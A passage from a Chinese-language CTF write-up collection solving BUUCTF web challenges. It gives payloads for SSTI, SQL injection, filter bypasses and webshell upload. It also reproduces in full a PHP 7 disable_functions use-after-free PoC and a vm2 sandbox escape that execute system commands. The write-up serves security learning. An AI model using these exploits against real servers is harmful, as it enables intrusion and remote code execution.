\"test\"); //签名\n$phar->stopBuffering();\n\n?>\n```\n\nphar访问即可\n\n## [红明谷CTF 2021]write_shell\n\n```\nif(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n\tdie('hacker!!!');\n```\n\n看看都过滤了啥\n\n空格，下划线，php，分号，~，^，+，eval，花括号\n\n首先是php标签绕过，有短标签\n\n```\n<?=`命令`?>\n<?echo\"1\"?>\n<% echo\"1\";%>\n```\n\n使用第一个来执行命令，然后就是空格，用制表符%09代替，根目录读取即可\n\n```\npayload:data=<?=`cat%09/flllllll1112222222lag`?>\n```\n\n## [HarekazeCTF2019]encode_and_encode\n\n```php\n<?php\nerror_reporting(0);\n\nif (isset($_GET['source'])) {\n  show_source(__FILE__);\n  exit();\n}\n\nfunction is_valid($str) {\n  $banword = [\n    // no path traversal\n    '\\.\\.',\n    // no stream wrapper\n    '(php|file|glob|data|tp|zip|zlib|phar):',\n    // no data exfiltration\n    'flag'\n  ];\n  $regexp = '/' . implode('|', $banword) . '/i';\n  if (preg_match($regexp, $str)) {\n    return false;\n  }\n  return true;\n}\n\n$body = file_get_contents('php://input');\n$json = json_decode($body, true);\n\nif (is_valid($body) && isset($json) && isset($json['page'])) {\n  $page = $json['page'];\n  $content = file_get_contents($page);\n  if (!$content || !is_valid($content)) {\n    $content = \"<p>not found</p>\\n\";\n  }\n} else {\n  $content = '<p>invalid request</p>';\n}\n\n// no data exfiltration!!!\n$content = preg_replace('/HarekazeCTF\\{.+\\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);\necho json_encode(['content' => $content]);\n```\n\n我真绕不过去啊，wp\n\n> json字符转译，json会将utf-8编码的字符自动转为原始字符\n\n这就好办了，直接将想读取内容中的flag进行utf-8编码即可，又因为下面对匹配flag的字符串进行了过滤，所以使用伪协议读取\n\n```\npayload:\nPOST\n{\"page\":\"\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067\"}\n```\n\n## [RootersCTF2019]I_<3_Flask\n\nSSTI很明显了，就是这个传参不好找，用个脚本Arjun用来爆参数的\n\n```\nname={{url_for.__globals__[\"os\"].popen('cat flag.txt').read()}}\n```\n\n## [NCTF2019]SQLi\n\n贴心的提示，ban的可真多\n\n```\n$black_list = \"/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\'|=| |in|<|>|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i\";\n\n\nIf $_POST['passwd'] === admin's password,Then you will get the flag;\n```\n\n所有的注释都没了，PHP版本又<5.3.4，使用00截断来裁切后面语句，构造payload\n\n```mysql\nusername=\\&passwd=||(passwd/**/regexp/**/\"^y\");%00\n构造出的语句就是\nselect * from users where username='\\' and passwd='||(passwd/**/regexp/**/\"^w\");%00'\n```\n\n```python\nimport requests\nimport time\nfrom urllib import parse\nurl=\"http://9ae4f74d-f7fe-4d73-8116-90698fc3d9d0.node4.buuoj.cn:81/index.php\"\nname=\"qwertyuiopasdfghjklzxcvbnm_}{0123456789\"\nflag=\"\"\nfor i in range(1,100):\n    for j in name:\n        tmp=flag+j\n        data={'username':'\\\\',\n            'passwd':f\"||(passwd/**/regexp/**/\\\"^{tmp}\\\");{parse.unquote('%00')}\"\n        }\n        co=requests.post(url=url,data=data).status_code\n        if co==404:\n            flag=tmp\n            print(j,end=\"\")\n#you_will_never_know7788990\n```\n\n脚本拿到password，再随便写一个除admin之外的user就行\n\n## [SUCTF 2019]EasyWeb\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\n看代码，应该是让我们执行`get_the_flag`函数再上传文件getshell\n\n首先是[正则绕过](https://blog.csdn.net/mochu7777777/article/details/104631142)，使用异或绕过\n\n```\n?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\n```\n\n下一步就是走文件内容过滤绕过了\n\n首先过了文件带ph后缀，然后检查文件中有没有<?，最后通过`exif_imagetype`看看是不是图片\n\n所有php类型文件想都不要想了，用.htaccess，但是如果直接添加幻数头会导致整个文件不被解析，所以新知识来辣\n\n> exif_imagetype()函数是PHP中的内置函数，用于确定图像的类型。\n>\n> **用法:**\n>\n> ```\n> int exif_imagetype( string $filename )\n> ```\n>\n> **参数：**该函数接受单个参数$filename，该参数保存图像的名称或URL。\n>\n> **返回值：**此函数返回与IMAGETYPE常量之一相对应的整数，如下所示：\n>\n> - IMAGETYPE_GIF(1)\n> - IMAGETYPE_JPEG(2)\n> - IMAGETYPE_PNG(3)\n> - IMAGETYPE_SWF(4)\n> - IMAGETYPE_PSD(5)\n> - IMAGETYPE_BMP(6)\n> - IMAGETYPE_TIFF_II(7)\n> - IMAGETYPE_TIFF_MM(8)\n> - IMAGETYPE_JPC(9)\n> - IMAGETYPE_JP2(10)\n> - IMAGETYPE_JPX(11)\n> - IMAGETYPE_JB2(12)\n> - IMAGETYPE_SWC(13)\n> - IMAGETYPE_IFF(14)\n> - IMAGETYPE_WBMP(15)\n> - IMAGETYPE_XBM(16)\n> - IMAGETYPE_ICO(17)\n> - IMAGETYPE_WEBP(18)\n\n只有当文件内容不属于以上任何一种图片类型的时候才会返回FALSE\n\n而在.htaccess中有两个注释符号\n\n```\n\\x00\n#\n```\n\n恰巧在图片中就有两种类型的图片是有这样开头的内容的\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09 23.51.41.png)\n\n> \\x00\\x00\\x85\\x85 只能放在文件开头位置\n\n> \\#define width 1337\n> \\#define height 1337\n> 可以放在文件任意位置\n\n注意好这个就可以上传成功.htaccess文件啦\n\n下面想想木马如何构造，由于对内容中的标签<?进行了过滤，所以是不能使用任何已知的短标签绕过方法进行绕过的，并且在这个版本的PHP中，类似于`<script language=\"php\">`这样的标签也是不生效的，骚操作来了，使用php伪协议用base64绕过，构造内容时在.htaccess中添加伪协议，最终构造出的shell和.htaccess文件如下\n\n```\n.htaccess\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n```\n\n```python\nimport requests\nimport base64\nhta=b'''\n#define width 1000\n#define height 1000\nAddType application/x-httpd-php .kkk\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_cc551ab005b2e60fbdc88de809b2c4b1/kk.kkk\"\n'''\nhta={'file':('.htaccess',hta,\"image/png\")}\nurl=\"http://42c1f3d3-4023-4a55-822e-532aa2640e28.node4.buuoj.cn:81/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=get_the_flag\"\nres=requests.post(url=url,files=hta).text\nprint(res)\nshell = b\"GIF89aaa\" + base64.b64encode(b\"<?php eval($_REQUEST['kkk']);?>\")\nshe={'file':('kk.kkk',shell,\"image/png\")}\nres=requests.post(url=url,files=she).text\nprint(res)\n```\n\n上传并访问，成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 00.09.32.png)\n\n可以看到禁用了巨多的函数，~~其实这里搜索flag就能直接拿到flag了~~，不能执行系统命令，open_basedir又被限制了，尝试[绕过](https://xz.aliyun.com/t/4720)\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\n然后拿flag\n\n```\npayload:\nkkk=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/THis_Is_tHe_F14g');\n```\n\n## [NPUCTF2020]ezinclude\n\n首先看源码提示，提示了pass内容，再看响应头中的Hash，直接传入，跳转flflflflag.php看内容中有个include，读取一把源码\n\n```php\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n```\n\n过滤了data，input，zip\n\n新知识\n\n> 可以利用\n>\n> php://filter/string.strip_tags\n>\n> 导致php崩溃，同时可上传文件保存在/tmp目录来上传木马。\n>\n> 利用条件：\n>\n> - php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复\n> - php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复\n> - php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n> - 可以获取文件名\n> - 源代码将GET参数进行文件包含\n\n构造python脚本\n\n```python\nimport requests\nurl = \"http://eecf8a4a-cb71-40a6-9ff8-6e21849084dd.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\nphpfile = \"<?php phpinfo(); ?>\"\nfiledata = {\n    \"file\":phpfile\n}\nbak = requests.post(url=url, files=filedata)\nprint(bak.text)\n```\n\n此时实例崩溃重启，但是/tmp中的内容依然保存，访问dir.php（目录扫描扫出来的）查看tmp中的内容，发现刚上传的文件，使用include包含后搜索flag拿到flag\n\n## [CISCN2019 华东南赛区]Double Secret\n\n进去访问/secret\n\n```\nTell me your secret.I will encrypt it so others can't see\n```\n\n传参数secret，输点乱七八糟的让它报错，看源码\n\n```python\n    if(secret==None):\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n    deS=rc.do_crypt(secret)\n    a=render_template_string(safe(deS))\n    if 'ciscn' in a.lower():\n        return 'flag detected!'\n    return a\n```\n\n就是对传入的secret进行RC4编码后再模版渲染\n\n偷一个师傅的脚本\n\n```python\nimport base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4加密主函数\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))\n    # print(\"原来的 s 盒：%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"混乱后的 s 盒：%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"调用加密程序成功。\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    cipher = \"\".join(res)\n    print(\"%s\" %quote(cipher))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{lipsum.__globals__.__builtins__.eval(\\\"__import__('os').popen('cat /flag.txt').read()\\\")}}\")\n```\n\n传入喵喵喵\n\n## [GYCTF2020]EasyThinking\n\n看这个题目怕不是ThinkPHP，随便搞一个不存在的目录，发现确实是ThinkPHP V6.0的一个session处任意文件写入漏洞\n\n> 大概就是在./runtime/session/目录下写入一个名为sess_SESSIONID的文件，内容是传入的参数内容\n\n那么在搜索处构造木马`<?php eval($_POST[a]);?>`\n\n然后访问`/runtime/session/sess_d62297dbd2f3523b5b66a5036c3f.php`\n\nban了一堆函数，找`disable_functions`绕过poc\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable \n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\npwn(\"ls /\");\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle(str_repeat('A', 79));\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n    exit();\n}\n?>\n```\n\n把命令改为/readflag并且使用蚁剑把poc上传并访问，成功拿到flag\n\n## [HFCTF2020]JustEscape\n\n首页提示了可能不是php哦\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10 01.09.27.png)\n\n看wp说是node.js~~本人完全没有接触过~~\n\n测试使用Error().stack函数，发现确实是node.js，是VM2沙箱逃逸，[现成poc](https://github.com/patriksimek/vm2/issues/225)直接使用\n\n```js\n\"use strict\";\nconst {VM} = require('vm2');\nconst untrusted = '(' + function(){\n    TypeError[`${`${`prototyp`}e`}`].get_process = f=>f.constructor(\"return process\")();\n    try{\n        Object.preventExtensions(Buffer.from(\"\")).a = 1;\n    }catch(e){\n        return e.get_process(()=>{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString();\n    }\n}+')()';\ntry{\n    console.log(new VM().run(untrusted));\n}catch(x){\n    console.log(x);\n}\n```\n\n但是这题有关键字过滤，在这使用javascript的模版文字绕过，如\n\n```\nprototype变成`${`${`prototyp`}e`}`\n```\n\n最终payload\n\n```js\n(function (){\n    TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=>f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)();\n    try{\n        Object.preventExtensions(Buffer.from(``)).a = 1;\n    }catch(e){\n        return e[`${`${`get_proces`}s`}`](()=>{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`cat /flag`).toString();\n    }\n})()\n```\n\n## [BJDCTF2020]EzPHP\n\n看源码，base32解码后访问\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0); \n\n$file = \"1nD3x.php\";\n$shana = $_GET['shana'];\n$passwd = $_GET['passwd'];\n$arg = '';\n$code = '';\n\necho \"<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>\";\n\nif($_SERVER) { \n    if (\n        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\"|\\'|log/i', $_SERVER['QUERY_STRING'])\n        )  \n        die('You seem to want to do something bad?'); \n}\n\nif (!preg_match('/http|https/i', $_GET['file'])) {\n    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { \n        $file = $_GET[\"file\"]; \n        echo \"Neeeeee! Good Job!<br>\";\n    } \n} else die('fxck you! What do you want to do ?!');\n\nif($_REQUEST) { \n    foreach($_REQUEST as $value) { \n        if(preg_match('/[a-zA-Z]/i', $value))  \n            die('fxck you! I hate English!'); \n    } \n} \n\nif (file_get_contents($file) !== 'debu_debu_aqua')\n    die(\"Aqua is the cutest five-year-old child in the world! Isn't it ?<br>\");\n\n\nif ( sha1($shana) === sha1($passwd) && $shana != $passwd ){\n    extract($_GET[\"flag\"]);\n    echo \"Very good! you know my password. But what is flag?<br>\";\n} else{\n    die(\"fxck you! you don't know my password! And you don't know sha1! why you come here!\");\n}\n\nif(preg_match('/^[a-z0-9]*$/isD', $code) || \npreg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&|\\$|\\*|\\||\\<|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i', $arg) ) { \n    die(\"<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w=\"); \n} else { \n    include \"flag.php\";\n    $code('', $arg); \n} ?>\nThis is a very simple challenge and if you solve it I will give you a flag. Good Luck!\nAqua is the cutest five-year-old child in the world! Isn't it ?\n```\n\n就是绕呗\n\n**P1**\n\n`$_SERVER[\"QUERY_STRING\"] `中是?后的内容，在直接读取时并不会进行url解码，但是在使用$_GET访问某一参数的时候会进行URL解码，在这里我们只需要对内容进行URL编码即可\n\n**P2**\n\n换行绕过\n\n**P3**\n\n在`$_REQUEST`中，POST的优先级大于GET传入的参量，所以我们再在POST中重新传一次同名参量就行\n\n**P4**\n\n伪协议绕过，记得URL编码\n\n**P5**\n\nSHA1强比较绕过，类似md5，用数组即可\n\n**P6**\n\n新知识：create_function()\n\n> create_function()注入原理：\n>\n> create_function()函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数\n\n```php\n<?php\n$afunc = create_function('$a, $b','return ($a+$b);');\necho $afunc(1,2);\n//输出3\n?>\n```\n\n> 而本题的$code('', $arg); //此处存在create_function()注入中可以通过控制$arg来进行代码注入\n> 首先保证传入的$code为create_funtion，\n> 其次是$arg参数，本题中过滤了cat、flag、scan等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数get_defined_vars()直接输出所有变量，构造payload如下\n\n```\nfl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//\n```\n\n然鹅还是拿不到flag，提示flag在`rea1fl4g.php`中，访问发现拿不到，应该是以变量形式放进去了，那么尝试包含这个文件并将所有变量打印出来应该就行了，include函数被ban，尝试require加base64编码\n\n```\nfl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//\n```\n\n给了个假的flag😅，读源码\n\n```\nrequire(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);\n滤的太多了走取反绕过吧\nfl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//\n```\n\n```\n\t$f4ke_flag = \"BJD{1am_a_fake_f41111g23333}\";\n\t$rea1_f1114g = \"flag{4821ec92-8b00-4b72-b98c-4a7a296d9073}\";\n\tunset($rea1_f1114g);\nunset就离谱！！！！！！！！！！！！！！！！！！！！！！！！！！！\n```\n\n## [GXYCTF2019]StrongestMind\n\n```python\nimport requests\nimport re\nimport time\nurl=\"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php\"\ncookie={\"PHPSESSID\":\"f564584a331647033d332274c6bc3eb5\"}\ntes=requests.get(url=url,cookies=cookie).text\ni=re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\",tes)\nprint(tes)\nfor j in range(1,2000):\n    data={'answer':f\"{eval(i[0])}\"}\n    tes=requests.post(url=url,cookies=cookie,data=data).text\n    i = re.findall(r\"\\d+\\s[\\/|\\+|\\*|-]\\s\\d+\", tes)\n    if \"flag{\" in tes:\n        print(tes)\n    else:\n        try:\n            print(re.findall(r'ç¬¬ \\d+ æ¬',tes)[0])\n        except:\n            print()\n    time.sleep(0.1)\n```\n\n没了\n\n## [MRCTF2020]Ezaudit\n\nwww.zip拿源码\n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // 若为空,视为未填写,提示错误,并3秒后返回登录界面\n        header('refresh:2; url=login.html');\n        echo \"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n\n```\n\n爆破种子\n\n```python\ns = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nkey = 'KVQP0LdJKRaV3n9D'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n```\n\n爆破出种子为1775196155，服务器PHP版本为5.6.40，爆出private_key，admin加万能密码即可\n\n## [SUCTF 2018]GetShell\n\n```php\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n} \n```\n\n黑名单过滤测试后发现滤掉了所有数字和字母，用取反或异或绕过\n\n```php\n$_=[];             //array\n$__=$_.$_;         //arrayarray \n$__=($_==$_); \t\t //true，结果为1\necho ~'茉'[$__];\t//s\necho ~'内'[$__];\t//y\necho ~'茉'[$__];\t//s\necho ~'苏'[$__];\t//t\necho ~'的'[$__];\t//e\necho ~'咩'[$__];\t//m\necho ~'课'[$__];\t//P\necho ~'尬'[$__];\t//O\necho ~'笔'[$__];\t//S\necho ~'端'[$__];\t//T\necho ~'瞎'[$__];\t//a\n```\n\n在这里可以这么使用是因为UTF-8编码在编码汉字时实际上是使用了三个单字符拼接编码的，使用[]即可取出中间的一个字符，再对这个字符进行取反操作，就可能能打印出我们想要的字符\n\n最终payload：\n\n```php\n<?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);\n```\n\n## [GYCTF2020]Easyphp\n\n反序列化，www.zip拿源码\n\n```php\n//lib.php\n<?php\nerror_reporting(0);\nsession_start();\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\nclass User\n{\n    public $id;\n    public $age=null;\n    public $nickname=null;\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;\n        $_SESSION['login']=1;\n        echo 